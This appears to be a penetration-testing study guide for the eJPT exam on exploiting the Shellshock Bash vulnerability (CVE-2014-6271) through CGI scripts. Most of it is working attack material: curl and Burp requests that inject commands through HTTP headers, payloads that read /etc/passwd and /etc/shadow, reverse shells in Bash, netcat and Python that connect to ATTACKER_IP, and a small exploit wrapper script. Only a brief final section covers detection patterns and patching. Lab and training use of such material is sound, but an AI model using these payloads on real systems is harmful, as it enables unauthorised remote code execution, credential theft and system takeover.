# üí• Shellshock (CVE-2014-6271) Exploitation

Comprehensive guide to exploiting the Shellshock vulnerability in Bash for remote code execution.

**Location in Framework:** `web-pentesting/shellshock-exploitation.md`

---

## üéØ What is Shellshock?

Shellshock (CVE-2014-6271) is a vulnerability in GNU Bash that allows attackers to execute arbitrary commands by manipulating environment variables. It affects CGI scripts and other applications that use Bash to process environment variables.

**Discovery Date:** September 24, 2014  
**Impact:** Remote Code Execution  
**CVSS Score:** 10.0 (Critical)

---

## üîç Vulnerability Discovery

### Nmap Detection
```bash
# Shellshock vulnerability scanning
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local

# Test multiple CGI paths
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/test.cgi" target.com
```

### Manual Detection via Source Code Analysis
Look for CGI scripts in webpage source:
```html
<script>
xhttp.open("GET", "gettime.cgi", true);
</script>
```

### Common CGI Locations
```
/cgi-bin/
/gettime.cgi
/test.cgi  
/scripts/
/cgi-local/
/fcgi-bin/
/cgi/
```

---

## üõ†Ô∏è Exploitation Methods

### Method 1: cURL Command Injection

#### Basic Payload
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://demo.ine.local/cgi-bin/vulnerable
```

#### Real Lab Example
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://localhost:8080/cgi-bin/vulnerable
```

### Method 2: Burp Suite Manual Exploitation

#### Step-by-Step Process:

1. **Intercept CGI Request**
   - Navigate to the CGI script in browser
   - Intercept request with Burp Suite

2. **Send to Repeater**
   - Right-click intercepted request
   - Select "Send to Repeater"

3. **Modify User-Agent Header**
   ```http
   GET /gettime.cgi HTTP/1.1
   Host: demo.ine.local
   User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
   Accept: */*
   ```

4. **Execute Payload**
   - Click "Send" in Repeater tab
   - Observe command output in response

---

## üß™ Real Lab Exploitation (From Images)

### Lab Environment Details:
- **Target:** demo.ine.local
- **CGI Script:** /gettime.cgi
- **Vulnerable Service:** HTTP on port 80

### Step 1: Discovery
```bash
nmap demo.ine.local
# Result: Port 80 is open

# View page source reveals CGI script
# Found: xhttp.open("GET", "gettime.cgi", true);
```

### Step 2: Vulnerability Verification
```bash
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

**Expected Output:**
```
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
```

### Step 3: Manual Exploitation via Burp Suite

**Original Request:**
```http
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
```

**Malicious Request:**
```http
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
Accept: */*
```

---

## üí£ Payload Variations

### System Information Gathering
```bash
# Get system information
User-Agent: () { :; }; echo; echo; /bin/bash -c 'uname -a'

# List directory contents
User-Agent: () { :; }; echo; echo; /bin/bash -c 'ls -la /var/www/html'

# Check current user
User-Agent: () { :; }; echo; echo; /bin/bash -c 'whoami'

# View environment variables
User-Agent: () { :; }; echo; echo; /bin/bash -c 'env'
```

### File System Exploration
```bash
# Read sensitive files
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/shadow'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/hosts'

# Find SUID binaries
User-Agent: () { :; }; echo; echo; /bin/bash -c 'find / -perm -4000 2>/dev/null'
```

### Network Reconnaissance
```bash
# Network configuration
User-Agent: () { :; }; echo; echo; /bin/bash -c 'ifconfig'

# Network connections
User-Agent: () { :; }; echo; echo; /bin/bash -c 'netstat -antup'

# Routing table
User-Agent: () { :; }; echo; echo; /bin/bash -c 'route -n'
```

---

## üîÑ Reverse Shell Techniques

### Bash Reverse Shell
```bash
# Basic reverse shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# URL-encoded reverse shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'
```

### Netcat Reverse Shell
```bash
# Traditional netcat
User-Agent: () { :; }; echo; echo; /bin/bash -c 'nc ATTACKER_IP 4444 -e /bin/bash'

# Netcat without -e flag
User-Agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f'
```

### Python Reverse Shell
```bash
# Python-based reverse shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
```

---

## üõ°Ô∏è Alternative HTTP Headers

Shellshock can be exploited through various HTTP headers that become environment variables:

### Common Vulnerable Headers
```http
User-Agent: () { :; }; echo; echo; /bin/bash -c 'command'
Referer: () { :; }; echo; echo; /bin/bash -c 'command'  
Cookie: () { :; }; echo; echo; /bin/bash -c 'command'
Accept: () { :; }; echo; echo; /bin/bash -c 'command'
Accept-Language: () { :; }; echo; echo; /bin/bash -c 'command'
X-Forwarded-For: () { :; }; echo; echo; /bin/bash -c 'command'
```

### Testing Multiple Headers
```bash
# Test all common headers
for header in "User-Agent" "Referer" "Cookie" "Accept"; do
    curl -H "$header: () { :; }; echo; echo; /bin/bash -c 'id'" \
         http://demo.ine.local/gettime.cgi
done
```

---

## üìã Testing Methodology

### 1. CGI Discovery
```bash
# Nmap CGI enumeration
nmap --script http-enum -p 80 target.com

# Manual directory brute forcing
dirb http://target.com/cgi-bin/
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x cgi,pl,sh
```

### 2. Vulnerability Verification
```bash
# Automated scanning
nmap --script http-shellshock target.com

# Manual testing
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo VULNERABLE'" http://target.com/cgi-bin/test.cgi
```

### 3. Exploitation
```bash
# Start listener
nc -lvp 4444

# Execute reverse shell payload
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
     http://target.com/cgi-bin/vulnerable.cgi
```

---

## üîß Tools and Automation

### Shocker - Shellshock Exploitation Tool
```bash
# Clone and use Shocker
git clone https://github.com/nccgroup/shocker.git
cd shocker
python shocker.py -H target.com --command "cat /etc/passwd" --cgipath /cgi-bin/test.cgi
```

### Custom Exploitation Script
```bash
#!/bin/bash
# Simple Shellshock tester

TARGET="$1"
CGI_PATH="$2"
COMMAND="$3"

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c '$COMMAND'" \
     "http://$TARGET$CGI_PATH" 2>/dev/null

# Usage: ./shellshock.sh demo.ine.local /gettime.cgi "whoami"
```

---

## üö® Impact and Risk Assessment

### Potential Impact:
- **Remote Code Execution** - Full system compromise
- **Data Exfiltration** - Access to sensitive files
- **Privilege Escalation** - Potential root access
- **Lateral Movement** - Network reconnaissance and pivoting
- **Persistent Access** - Backdoor installation

### Risk Factors:
- Publicly accessible CGI scripts
- Web servers running vulnerable Bash versions
- Insufficient input validation
- Legacy systems without security updates

---

## üõ°Ô∏è Detection and Prevention

### Detection Methods:
```bash
# Log analysis for Shellshock attacks
grep -r "() {" /var/log/apache2/
grep -r "; echo;" /var/log/nginx/

# Network monitoring
tcpdump -A -i eth0 port 80 | grep -i "user-agent.*() {"
```

### Prevention Measures:
1. **Update Bash** to patched versions
2. **Disable CGI** if not required
3. **Input validation** for HTTP headers
4. **Web Application Firewall** rules
5. **Security headers** and restrictions

---

## üéØ eJPT Exam Focus

### Key Concepts:
1. **CGI vulnerability identification**
2. **HTTP header manipulation**
3. **Bash environment variable exploitation**
4. **Remote code execution techniques**
5. **Manual exploitation with Burp Suite**

### Common Exam Tasks:
- Discover CGI scripts through source code analysis
- Use Nmap scripts for vulnerability detection
- Exploit via Burp Suite Repeater
- Execute system commands for reconnaissance
- Demonstrate impact through file access

### Essential Commands:
```bash
# Discovery
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" target.com

# Manual exploitation
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://target.com/cgi

# Reverse shell
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'" http://target.com/cgi
```
